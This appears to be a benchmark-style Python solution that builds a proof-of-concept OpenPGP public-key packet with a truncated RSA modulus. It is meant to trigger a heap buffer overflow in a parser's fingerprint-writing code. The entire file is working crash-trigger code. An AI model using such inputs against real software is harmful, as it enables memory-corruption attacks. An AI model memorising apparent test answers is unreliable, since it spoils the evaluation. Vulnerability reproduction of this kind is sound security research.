import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability in OpenPGP fingerprint writing.
        The vulnerability allows the code to proceed to fingerprint calculation even after a parsing step fails.
        We simulate this by providing a Public Key packet with a truncated MPI (Modulus), causing the
        read step to fail (which is ignored/logged), leading to a buffer overflow when the code
        attempts to write the fingerprint based on invalid state.
        """
        
        # OpenPGP Public Key Packet (Tag 6)
        # Using Old Format Packet Header: Tag 0x99 (Tag 6, Length Type 1 - 2 bytes)
        tag = 0x99
        
        # Packet Body Construction:
        # Version: 4
        # Timestamp: 4 bytes (arbitrary)
        # Algorithm: 1 (RSA)
        # MPI n (Modulus): Declared length 4096 bits, but actual data will be truncated.
        
        payload = bytearray()
        payload.append(0x04)                    # Version 4
        payload.extend(b'\x00\x00\x00\x00')     # Timestamp
        payload.append(0x01)                    # Algo: RSA
        
        # MPI Header: Claiming 4096 bits (512 bytes)
        # The parser expects 512 bytes of data following this.
        payload.extend(struct.pack('>H', 4096))
        
        # Truncated Data: Provide only 1 byte of data.
        # The internal parser will fail to read the full MPI, log an error,
        # but the vulnerable code proceeds to write the fingerprint.
        payload.append(0xAA)
        
        # Packet Length: Set to the ACTUAL length of the provided payload.
        # This ensures the outer packet framer accepts the packet, passing the
        # malformed body to the inner key parser which triggers the bug.
        pkt_len = len(payload)
        
        poc = bytearray()
        poc.append(tag)
        poc.extend(struct.pack('>H', pkt_len))
        poc.extend(payload)
        
        return bytes(poc)